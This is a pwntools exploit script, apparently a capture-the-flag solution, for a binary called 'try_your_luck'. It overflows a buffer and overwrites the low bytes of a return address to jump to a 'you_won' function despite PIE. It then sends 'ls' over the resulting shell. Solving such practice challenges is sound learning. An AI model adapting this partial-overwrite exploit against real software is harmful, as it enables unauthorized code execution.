#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('try_your_luck')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("yourluck.challs.cyberchallenge.it", 6013, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
br game
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

#Idea: stack pivot di main dato che PIE non cambia del tutto gli indirizzi ma solo la prima parte

io = start()

str_test = "01234567"*5

#Let's bruteforce the half-byte "a" in order to jump directly to you_won
io.send(str_test + chr(0x3a) + chr(0xa8))
io.recvuntil(str_test)

main_addr = io.recvuntil("...", True)
print("%x"%int.from_bytes(main_addr, "little"))

io.sendline("ls")

io.interactive()

